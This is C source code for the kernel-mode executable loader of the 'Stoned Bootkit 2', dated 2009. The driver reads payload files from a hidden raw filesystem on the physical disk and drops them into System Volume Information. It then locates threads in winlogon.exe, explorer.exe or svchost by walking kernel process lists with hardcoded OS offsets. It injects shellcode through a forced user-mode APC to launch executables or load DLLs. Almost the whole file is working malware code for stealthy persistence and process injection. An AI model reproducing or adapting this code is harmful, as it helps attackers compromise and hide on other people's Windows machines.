
// Exe Loader for the Stoned Bootkit 2
// developed by Insecurity Systems InSec e.U.

// (C) 2009 Peter Kleissner
// published under the European Union Public License


/* includes and included definitions */

#include "ntifs.h"
#include "windef.h"
#include "RawFS.h"


/* Stoned Bootkit Framework includes */

#define SbNotifyDriverLoad              0
#define SbKillOS                        1
#define SbInstallWindowsHook            2
#define SbGetData                       3

#define HookType_Hook                   0   // hooking a function = control passed to hook, then original function is called        (before a function is called)
#define HookType_Intercept              1   // intercepting a function = getting function parameters, return value and return eip   (after a function is called)

#define DataIdentifier_Loading_Table    0

struct
{
  void * FunctionName;
  void * FunctionHook;
  unsigned Type;
} Hook;

#pragma pack(1)

typedef struct
{
  DWORD FileName;
  DWORD SectorNumber;
  DWORD Size;
  BYTE LoadingBits;
} Loading_Descriptor;

#define FileNameType_PhysicalDrive0     1
#define FileNameType_CdRom              2
#define FileNameType_FileName           3


/* other defines */

typedef enum _KAPC_ENVIRONMENT {
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;

NTKERNELAPI VOID KeInitializeApc (
  IN PRKAPC Apc,
  IN PKTHREAD Thread,
  IN KAPC_ENVIRONMENT Environment,
  IN PKKERNEL_ROUTINE KernelRoutine,
  IN PKRUNDOWN_ROUTINE RundownRoutine OPTIONAL,
  IN PKNORMAL_ROUTINE NormalRoutine OPTIONAL,
  IN KPROCESSOR_MODE ApcMode,
  IN PVOID NormalContext
);

BOOLEAN
KeInsertQueueApc(
	PKAPC Apc,
	PVOID SystemArgument1,
	PVOID SystemArgument2,
	UCHAR unknown
	);

typedef struct {
  DWORD Reserved1;
  DWORD Event;
  BYTE ImportsResolved;
  BYTE StartType;
  CHAR FileName[MAX_PATH];
} ShellcodeControlBlock;


/* forward declarations */

int SetOffsets();
int OpenRawFS();
int FindThread(char * ProcessName, PEPROCESS * Process, PETHREAD * Thread);
void StartUserModeProcess(void * Nothing);
int InstallUserModeApc(PKTHREAD TargetThread, PEPROCESS TargetProcess);
int StartFile(char * RelativeFileName, char * InProcess, int StartType);
int CreateWhistlerDirectory();
int ExtractRawFSFile(Loading_Descriptor * LoadingTable, wchar_t * RelativeFileName);
int ExtractRawFSFile2(char * MD5FileName, wchar_t * RelativeFileName, BOOL Overwrite);


/* Whistler includes */

#define WHISTLER_BASE_DIRECTORY_USERMODE      "C:\\System Volume Information\\Whistler\\"
#define WHISTLER_BASE_DIRECTORY_KERNELMODE    L"\\??\\C:\\System Volume Information\\Whistler\\"


/* shellcode for starting the user-mode process */

#pragma alloc_data(PAGE, bin_data1)
#pragma alloc_data(PAGE, SCB)
#include "Shellcode\Loader Shellcode.cpp"
ShellcodeControlBlock SCB;


/* public data */

DWORD OffsetAPL, OffsetIN, OffsetST, OffsetTLH, OffsetTLE, OffsetAlertable, OffsetApcState;     // offsets for OS specific structures (used by the whole program)
BOOLEAN IsWindows2000 = FALSE;

HANDLE PhysicalDrive0;
DWORD StartSector;



/* the real true driver entry point, name it always GsDriverEntry@8 */

NTSTATUS GsDriverEntry(void * ModuleAddress, int (* StonedCallback)(unsigned FunctionNumber, void * Param))
{
  HANDLE ThreadHandle;
  OBJECT_ATTRIBUTES ObjectAttributes;
	SCB.ImportsResolved = FALSE;

  DbgPrint("\nYour PC is now Stoned!  ..again!\n\n");
  
  if (!SetOffsets())
    return STATUS_KEY_DELETED;
  if (!OpenRawFS())
    return STATUS_INVALID_HANDLE;

  InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
  PsCreateSystemThread(&ThreadHandle, STANDARD_RIGHTS_ALL, &ObjectAttributes, NULL, NULL, &StartUserModeProcess, StonedCallback);
  
	ZwClose(ThreadHandle);
  return STATUS_SUCCESS;
}


/* disable further debug output */
//#define DbgPrint


/* sets the offsets for OS specific structures */

int SetOffsets()
{
/*  OS                      ActiveProcessLink   ImageName           SecurityToken   ThreadListHead  ThreadListEntry   Alertable   ApcState
                            EPROCESS            EPROCESS            EPROCESS        EPROCESS        ETHREAD           KTHREAD     KTHREAD
    Windows 2000            + A0h               ++ 15Ch             ++ 8Ch          ++ 1D0h         + 240h            + 158h      + 34h
    Windows XP              + 88h               ++ ECh              ++ 40h          ++ 108h         + 22Ch            + 164h      + 34h
    Windows Server 2003     + 88h               ++ CCh              ++ 40h          ++ E8h          + 234h            + 58h       + 34h
    Windows Server 2003 R2  + 98h               ++ CCh              ++ 40h          ++ E8h          + 224h            + 58h       + 28h
    Windows Vista           + A0h               ++ ACh              ++ 40h          ++ C8h          + 248h            + 68h:5     + 38h
    Windows Server 2008     + A0h               ++ ACh              ++ 40h          ++ C8h          + 248h            + 68h:5     + 38h
    Windows 7               + B8h               ++ B4h              ++ 40h          ++ D0h          + 268h            + 3Ch:5     + 40h
*/
  RTL_OSVERSIONINFOW OSVersionInfo;

  // set offsets according to the operating system (and above table)
  OSVersionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
  PsGetVersion(&OSVersionInfo.dwMajorVersion, &OSVersionInfo.dwMinorVersion, NULL, NULL);

  if (!(OSVersionInfo.dwMajorVersion == 5 && OSVersionInfo.dwMinorVersion == 0))      // RtlGetVersion() is only support on XP and higher
    RtlGetVersion(&OSVersionInfo);

  if (OSVersionInfo.dwMajorVersion == 5 && OSVersionInfo.dwMinorVersion == 0)         // Windows 2000
  { OffsetAPL = 0xA0; OffsetIN = 0x15C;  OffsetST = 0x8C; IsWindows2000 = TRUE; OffsetTLH = 0x1D0; OffsetTLE = 0x240; OffsetAlertable = 0x158; OffsetApcState = 0x34; }
  else if (OSVersionInfo.dwMajorVersion == 5 && OSVersionInfo.dwMinorVersion == 1)    // Windows XP
  { OffsetAPL = 0x88; OffsetIN = 0xEC;  OffsetST = 0x40; OffsetTLH = 0x108; OffsetTLE = 0x22C; OffsetAlertable = 0x164; OffsetApcState = 0x34; }
  else if (OSVersionInfo.dwMajorVersion == 5 && OSVersionInfo.dwMinorVersion == 2)    // Windows Server 2003
  { OffsetAPL = 0x88; OffsetIN = 0xCC;  OffsetST = 0x40; OffsetTLH = 0xE8; OffsetTLE = 0x234; OffsetAlertable = 0x58; OffsetApcState = 0x34;
    if (OSVersionInfo.dwBuildNumber == 3790)  OffsetAPL += 0x10; OffsetTLE = 0x224;  OffsetApcState = 0x28;}      // Windows Server 2003 R2
  else if (OSVersionInfo.dwMajorVersion == 6 && OSVersionInfo.dwMinorVersion == 0)    // Windows Vista, Windows Server 2008
  { OffsetAPL = 0xA0; OffsetIN = 0xAC;  OffsetST = 0x40; OffsetTLH = 0xC8; OffsetTLE = 0x248; OffsetAlertable = 0x68; OffsetApcState = 0x38;  }
  else if (OSVersionInfo.dwMajorVersion == 6 && OSVersionInfo.dwMinorVersion == 1)    // Windows 7 RC / RTM
  { OffsetAPL = 0xB8; OffsetIN = 0xB4;  OffsetST = 0x40; OffsetTLH = 0xD0; OffsetTLE = 0x268; OffsetAlertable = 0x3C; OffsetApcState = 0x40;
    if (OSVersionInfo.dwBuildNumber == 7000)  OffsetIN = 0xAC;    }                   // Windows 7 Beta
  else
  {
    DbgPrint("Exe Loader is only supported on 2000, XP, Server 2003, Server 2003 R2, Vista, Server 2008 and 7\n");
    return FALSE;
  }

  return TRUE;  
}


/* opens the RawFS volume */

int OpenRawFS()
{
  OBJECT_ATTRIBUTES ObjectAttributes;
  IO_STATUS_BLOCK IoStatusBlock;
  UNICODE_STRING DeviceName;
  HANDLE FileHandle;
  NTSTATUS Status;

  RtlInitUnicodeString(&DeviceName, L"\\??\\PhysicalDrive0");
  InitializeObjectAttributes(&ObjectAttributes, &DeviceName, OBJ_KERNEL_HANDLE, NULL, NULL);

  if (ZwCreateFile(&PhysicalDrive0, GENERIC_WRITE | GENERIC_READ | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0) != STATUS_SUCCESS)
  {
    DbgPrint("Error creating handle to PhysicalDrive0\n");
    return 0;
  }

	if (RawFS_CheckVolumeExists(PhysicalDrive0, &StartSector) != RawFS_Successful)
  {
    DbgPrint("Error checking RawFS volume\n");
    return 0;
  }

  return 1;
}





/* starting the process (function is executed in a system thread) */

void StartUserModeProcess(int (* StonedCallback)(unsigned FunctionNumber, void * Param))
{
  Loading_Descriptor * LoadingTable;
  HANDLE FileHandle;
  OBJECT_ATTRIBUTES ObjectAttributes;
  IO_STATUS_BLOCK IoStatusBlock;
  LARGE_INTEGER AllocationSize;
	LARGE_INTEGER Time;
	NTSTATUS Status;

  BYTE * LoadFileList;
  DWORD LoadFileListSize;
	
	// create the Whistler directory
	if (!CreateWhistlerDirectory())
    PsTerminateSystemThread(0);

#ifdef _USE_LOADING_TABLE
	// extract the executable
	DbgPrint("Parse loading table\n");
	LoadingTable = (Loading_Descriptor *)StonedCallback(SbGetData, (void *)DataIdentifier_Loading_Table);
	while (LoadingTable->FileName)
	{
	  if (! (LoadingTable->LoadingBits & 0x08))
    {
	    DbgPrint("Found driver to start at 0x%08x\n", LoadingTable);
      LoadingTable++;
      continue;
	  } // -> found
    DbgPrint("Found file to start: executable\n");

    // create the file C:\System Volume Information\Whistler.exe
    if (!ExtractRawFSFile(LoadingTable, L"Whistler.exe"))
      PsTerminateSystemThread(0);
    
    // start the executable
    StartFile("Whistler.exe", "winlogon.exe", 0);

    break;
  }
#else

  // read file list via RawFS
  Status = RawFS_ReadFile(PhysicalDrive0, StartSector, MD5_FileList, &LoadFileList, &LoadFileListSize);
  if (Status != RawFS_Successful)
  {
    DbgPrint("Error reading file list with %08x\n", Status);
    PsTerminateSystemThread(0);
  }
  if (LoadFileListSize < 36)
  {
    DbgPrint("Load file list empty.\n", Status);
    PsTerminateSystemThread(0);
  }
  
	DbgPrint("Parse file loading table\n");
  while (LoadFileListSize >= 36)
  {
    BYTE LoadType = *LoadFileList;            // "2 " <- loading type, 0 = extract, 1 = start executable, 2 = start dll
    char MD5FileName[32];
    wchar_t ExtractFileNameU[51];
    char ExtractFileNameA[51];
    int n = 0;
    LoadFileList += 2;
    
    memcpy(MD5FileName, LoadFileList, 32);    // "74c29c7632e09d26c18062c4ee4452c4 " <-
    LoadFileList += 33;
    LoadFileListSize -= 35;
    
    while (*(WORD *)LoadFileList != 0x0A0D && LoadFileListSize && n < 50)
    {
      ExtractFileNameU[n] = 0;
      (BYTE)ExtractFileNameU[n] = *LoadFileList;
      ExtractFileNameA[n] = *LoadFileList;
      
      LoadFileList++;
      LoadFileListSize--;
      n++;
    }
    ExtractFileNameU[n] = 0;
    ExtractFileNameA[n] = 0;
    if (LoadFileListSize)
    {
      LoadFileList += 2;
      LoadFileListSize -= 2;
    }
    
    // interpret it
	  DbgPrint("Extract %s to %s\n", MD5FileName, ExtractFileNameA);
    if (!ExtractRawFSFile2(MD5FileName, ExtractFileNameU, LoadType == '4' ? FALSE : TRUE))
      continue;
    
    if (LoadType == '0')                      // 0 just extract (overwrite if exists)
      continue;
    else if (LoadType == '1')                 // 1 start executable under winlogon.exe
      StartFile(ExtractFileNameA, "winlogon.exe", 0);
    else if (LoadType == '2')                 // 2 start executable under explorer.exe
      StartFile(ExtractFileNameA, "explorer.exe", 0);
    else if (LoadType == '3')                 // 3 inject dll into new remote svchost.exe process (from winlogon.exe)
      StartFile(ExtractFileNameA, "winlogon.exe", 1);
    else if (LoadType == '4')                 // 4 extract file (do not overwrite)
      continue;
  }

#endif

	Time.QuadPart = -80000000I64;  // wait 8 seconds
  KeDelayExecutionThread(KernelMode, FALSE, &Time);

  DbgPrint("This is it\n");
  PsTerminateSystemThread(0);
}


/* starts the file
      0 = executable (started in any process)
      1 = dll (attached to new svchost.exe)
   returns true if successful
*/

int StartFile(char * RelativeFileName, char * InProcess, int StartType)
{
  PEPROCESS Process;
  PETHREAD Thread;
	LARGE_INTEGER Time;
	Time.QuadPart = -10000000I64;    // wait 1 seconds

  if (StartType == 0)
    DbgPrint("Start executable %s in process %s\n", RelativeFileName, InProcess);  
  else
    DbgPrint("Start library %s in process %s\n", RelativeFileName, InProcess);  

  // copy the file name to the Shellcode Control Block
  strcpy(SCB.FileName, WHISTLER_BASE_DIRECTORY_USERMODE);
  strcat(SCB.FileName, RelativeFileName);
  DbgPrint("Start %s\n", SCB.FileName);  

  while (1)
  {
    KeDelayExecutionThread(KernelMode, FALSE, &Time);
    
    if (FindThread(InProcess, &Process, &Thread))
    {
      if (InstallUserModeApc(Thread, Process))
      {
        break;
      }
    }
  }
  
  return 1;
}


/* creates the Whistler directory
   returns true if successful
*/

int CreateWhistlerDirectory()
{
  OBJECT_ATTRIBUTES ObjectAttributes;
  IO_STATUS_BLOCK IoStatusBlock;
  UNICODE_STRING DirectoryName;
  HANDLE FileHandle;
  NTSTATUS Status;

  RtlInitUnicodeString(&DirectoryName, WHISTLER_BASE_DIRECTORY_KERNELMODE);
  InitializeObjectAttributes(&ObjectAttributes, &DirectoryName, OBJ_KERNEL_HANDLE, NULL, NULL);

	// create the Whistler directory
  Status = ZwCreateFile(&FileHandle, 0, &ObjectAttributes, &IoStatusBlock, 0, 0, 0, FILE_CREATE, FILE_DIRECTORY_FILE, NULL, 0);
  if (Status != STATUS_SUCCESS && Status != STATUS_OBJECT_NAME_COLLISION)
  {
    DbgPrint("Could not create directory, error %0x\n", Status);
    return 0;
  }
  ZwClose(FileHandle);

  return 1;
}


/* extracts a file from RawFS to usual Windows file system
   returns true if successful
*/

int ExtractRawFSFile(Loading_Descriptor * LoadingTable, wchar_t * RelativeFileName)
{
  HANDLE FileHandle;
  OBJECT_ATTRIBUTES ObjectAttributes;
  IO_STATUS_BLOCK IoStatusBlock;
  LARGE_INTEGER AllocationSize;
  UNICODE_STRING SourceFileName;
  BYTE * FileBuffer;
  LARGE_INTEGER ByteOffset;
  NTSTATUS Status;
  wchar_t UnicodeName[MAX_PATH];
  UNICODE_STRING DestinationFileName;
  
  // set the source and destination file names
  wcscpy(UnicodeName, WHISTLER_BASE_DIRECTORY_KERNELMODE);
  wcscat(UnicodeName, RelativeFileName);
  RtlInitUnicodeString(&DestinationFileName, UnicodeName);

  switch (LoadingTable->FileName)
  {
    case FileNameType_PhysicalDrive0:
      RtlInitUnicodeString(&SourceFileName, L"\\??\\PhysicalDrive0");
      DbgPrint("Start executable from \\??\\PhysicalDrive0\n");
      break;
    case FileNameType_CdRom:
      RtlInitUnicodeString(&SourceFileName, L"\\??\\CdRom0");
      DbgPrint("Start executable from \\??\\CdRom0\n");
      break;
    case FileNameType_FileName:
      RtlInitUnicodeString(&SourceFileName, (void *)LoadingTable->SectorNumber);
      LoadingTable->SectorNumber = 0;
      break;
    default:
      return 0;
  };
  
  FileBuffer = ExAllocatePool(NonPagedPool, LoadingTable->Size);
  if (!FileBuffer)
    return 0;

  AllocationSize.LowPart = LoadingTable->Size;
  ByteOffset.QuadPart = 0;
  ByteOffset.LowPart = LoadingTable->SectorNumber;
  ByteOffset.QuadPart *= 512;

  // read the file from RawFS
  InitializeObjectAttributes(&ObjectAttributes, &SourceFileName, OBJ_KERNEL_HANDLE, NULL, NULL);
  if (ZwCreateFile(&FileHandle, GENERIC_WRITE | GENERIC_READ | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0) != STATUS_SUCCESS)
    return 0;

  if (ZwReadFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, FileBuffer, LoadingTable->Size, &ByteOffset, NULL) != STATUS_SUCCESS)
    return 0;
  
  ZwClose(FileHandle);
  
  // write the new file
  DbgPrint("Create File %ws\n", DestinationFileName.Buffer);
  InitializeObjectAttributes(&ObjectAttributes, &DestinationFileName, OBJ_KERNEL_HANDLE, NULL, NULL);

  ZwDeleteFile(&ObjectAttributes);
  
  Status = ZwCreateFile(&FileHandle, GENERIC_WRITE | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock,&AllocationSize, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
  if (Status != STATUS_SUCCESS && Status != STATUS_FILE_CORRUPT_ERROR)
  {
    DbgPrint("Could not create file, error %0x\n", Status);
    return 0;
  }

  ByteOffset.QuadPart = 0;
  if (ZwWriteFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, FileBuffer, LoadingTable->Size, &ByteOffset, NULL) != STATUS_SUCCESS)
  {
    DbgPrint("Could not write file, error %0x\n", Status);
    return 0;
  }

  ZwClose(FileHandle);
  
  return 1;
}


/* extracts a file from RawFS to usual Windows file system
   returns true if successful
*/

int ExtractRawFSFile2(char * MD5FileName, wchar_t * RelativeFileName, BOOL Overwrite)
{
  wchar_t UnicodeName[MAX_PATH];
  UNICODE_STRING DestinationFileName;
  
  // set the destination file name
  wcscpy(UnicodeName, WHISTLER_BASE_DIRECTORY_KERNELMODE);
  wcscat(UnicodeName, RelativeFileName);
  RtlInitUnicodeString(&DestinationFileName, UnicodeName);
  
  if (RawFS_ExtractFile(PhysicalDrive0, StartSector, MD5FileName, &DestinationFileName, Overwrite) == RawFS_Successful)
    return 1;
  else
    return 0;
}


/* looks for a user-mode thread of a process */

int FindThread(char * ProcessName, PEPROCESS * Process, PETHREAD * Thread)
{
  PLIST_ENTRY CurrentProcess, StartProcess;
  PLIST_ENTRY	ThreadList, StartThread;
  BOOLEAN FoundUserModeThread = FALSE;
  DWORD TcbAddress;

  *Process = NULL;
  *Thread = NULL;

  // find the correct process  
  StartProcess = CurrentProcess = (PLIST_ENTRY)((BYTE *)PsGetCurrentProcess() + OffsetAPL);

  do
  {
    DbgPrint("Found Process: %s\n", (char *)CurrentProcess + OffsetIN);
    if (_stricmp((char *)CurrentProcess + OffsetIN, ProcessName) == 0)
    {
      *Process = (PEPROCESS)((PBYTE)CurrentProcess - OffsetAPL);
      break;
    }
    
    CurrentProcess = CurrentProcess->Flink;
  } while (StartProcess != CurrentProcess);
  
  if (*Process == NULL)
    return FALSE;
  
  // find a user-mode thread
  StartThread = ThreadList = ((LIST_ENTRY *)( (BYTE *)CurrentProcess + OffsetTLH ))->Flink;

  do
  {
    *Thread = (PETHREAD)((PBYTE)ThreadList - OffsetTLE);
    if (!IsWindows2000)                                     // > Windows XP
    {
      if (!PsIsSystemThread(*Thread))
        {
          DbgPrint("found a motherfucking Process 0x%x, Thread : 0x%x\n", *Process, *Thread);
        return TRUE;
      }
    }
    else                                                    // Windows 2000
    {
      TcbAddress = *(DWORD *)((PBYTE)(*Thread) + 0x20);
      if (TcbAddress && (void *)TcbAddress < MmSystemRangeStart)
        return TRUE;
    }

    ThreadList = ThreadList->Flink;
  } while (ThreadList != StartThread);
  
  DbgPrint("No user-mode thread found\n");
  return FALSE;
}


/* APC kernel callback  - setting the Shellcode Control Block */
void * Mapped_SCB = NULL;

void KernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, IN OUT PVOID *NormalContext,	IN OUT PVOID *SystemArgument1, IN OUT PVOID *SystemArgument2)
{
  *NormalContext = Mapped_SCB;
//  DbgPrint("Setting parameter to 0x%x\n", Mapped_SCB);
}


/* puts the APC to the user mode thread */

int InstallUserModeApc(PETHREAD TargetThread, PEPROCESS TargetProcess)
{
  KAPC KApc;
  KAPC_STATE ApcState;
	PMDL pMDL, pMDL_SCB;
  void * MappedAddress = NULL;
  HANDLE hEvent;
	NTSTATUS Status;
	LARGE_INTEGER LI={0};
	
	DbgPrint("Process 0x%x, Thread : 0x%x\n", TargetProcess, TargetThread);

	pMDL = IoAllocateMdl(&bin_data1, sizeof(bin_data1), FALSE, FALSE, NULL);
	pMDL_SCB = IoAllocateMdl(&SCB, sizeof(ShellcodeControlBlock), FALSE, FALSE, NULL);
	if (!pMDL || !pMDL_SCB)
	{
	  DbgPrint("Error with IoAllocateMdl\n");
		return FALSE;
	}
	
	__try
	{
		MmProbeAndLockPages(pMDL, KernelMode, IoWriteAccess);
		MmProbeAndLockPages(pMDL_SCB, KernelMode, IoWriteAccess);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		IoFreeMdl(pMDL);
		DbgPrint("Error with MmProbeAndLockPages\n");
		return FALSE;
	}
	
  KeStackAttachProcess(TargetProcess, &ApcState);

	__try
	{
  	MappedAddress = MmMapLockedPagesSpecifyCache(pMDL, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
  	Mapped_SCB = MmMapLockedPagesSpecifyCache(pMDL_SCB, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		MmUnlockPages(pMDL);
		IoFreeMdl(pMDL);
		DbgPrint("Error with MmMapLockedPagesSpecifyCache\n");
		return FALSE;
	}
	
	if (!MappedAddress || !Mapped_SCB)
	{
		KeUnstackDetachProcess(&ApcState);
		MmUnlockPages(pMDL);
		IoFreeMdl(pMDL);
		DbgPrint("Error with MmMapLockedPagesSpecifyCache\n");
		return FALSE;
	}

	DbgPrint("pMDL : 0x%p, &NormalRoutine : 0x%x, MappedAddress: 0x%x and 0x%x\n", pMDL, (PVOID)&bin_data1, MappedAddress, Mapped_SCB);
  

  // create the event
	Status = ZwCreateEvent(&hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
	if (!NT_SUCCESS(Status))
	{	
		KeUnstackDetachProcess(&ApcState);
		MmUnlockPages(pMDL);
		IoFreeMdl(pMDL);
		DbgPrint("Error with ZwCreateEvent : 0x%x\n", Status);
		return FALSE;
	}
	SCB.Event = (DWORD)hEvent;

	LI.QuadPart = -20000000;    // wait 2 second
	KeDelayExecutionThread(KernelMode, FALSE, &LI);


	// all the magic...
	KeInitializeApc(&KApc, (PKTHREAD)TargetThread, CurrentApcEnvironment, &KernelRoutine, NULL, MappedAddress, UserMode, NULL);

//  *((PBYTE)TargetThread + OffsetAlertable) = 1;   // be aware of Vista, Server 2008, 7 (Alertable:5)!
  ((KAPC_STATE *)((PBYTE)TargetThread + OffsetApcState))->UserApcPending = 1;

	DbgPrint("Queuing APC : 0x%x\n", &KApc);
	DbgPrint("Mapped SCB 0x%x and event 0x%x\n", Mapped_SCB, hEvent);
	if(!KeInsertQueueApc(&KApc, /*Mapped_SCB*/NULL, NULL, 0))		
	{
		DbgPrint("Error with KeInsertQueueApc\n");
		return FALSE;
	}


  // wait for execution to finish
	DbgPrint("Waiting for execution..\n");
	Status = ZwWaitForSingleObject(hEvent, FALSE, NULL);				
	if(!NT_SUCCESS(Status))
	{
		DbgPrint("Error with ZwWaitForSingleObject : 0x%x\n", Status);
		return FALSE;
	}

  ZwClose(hEvent);
  MmUnmapLockedPages(MappedAddress, pMDL);
  MmUnmapLockedPages(Mapped_SCB, pMDL_SCB);
	MmUnlockPages(pMDL_SCB);
	MmUnlockPages(pMDL);
	IoFreeMdl(pMDL_SCB);
	IoFreeMdl(pMDL);
	KeUnstackDetachProcess(&ApcState);
										
	DbgPrint("Executed APC successfully.\n");

  return TRUE;
}

